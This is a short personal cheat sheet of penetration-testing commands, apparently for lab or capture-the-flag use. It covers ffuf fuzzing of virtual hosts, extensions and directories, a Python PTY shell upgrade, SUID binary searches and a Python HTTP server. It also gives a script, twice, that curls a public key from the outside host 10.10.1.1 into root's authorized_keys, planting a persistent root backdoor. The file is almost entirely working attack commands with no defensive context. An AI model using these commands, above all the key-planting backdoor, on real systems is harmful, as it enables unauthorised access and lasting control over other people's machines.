# notes
Just some notes for myself which i can almost always reach remotely 

* VHOST scan

```
ffuf -w ~/Documents/fuzz/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://domain.com/ -H 'Host: FUZZ.domain.com' -ac
```
* Fuzz extensions
```
ffuf -w ~/Documents/fuzz/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://domain.com/indexFUZ
```

* Fuzz content
```
ffuf -w ~/Documents/fuzz/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://dev.domain.com/FUZZ -ac
```

* Diff two websites
```
diff <(curl -s http://dev.domain.com/static) <(curl -s http://dev.domain.com/Static)
```



* PTY 
`python3 -c 'import pty; pty.spawn("/bin/sh")'`

* Process tree
```ps -ef --forest ```

* SUID
```
find / -perm -u=s -type f 2>/dev/null
of
find / -perm -4000 2>/dev/null
```

* SSH
```
#!/bin/bash

mkdir /root/.ssh/
chmod 600 /root/.ssh
curl 10.10.1.1/b0x41s.pub >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

* Simple HTTP python
```
python3 -m http.server 8000
```

* SSH
```
mkdir /root/.ssh/
chmod 600 /root/.ssh
curl 10.10.1.1/b0x41s.pub >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```
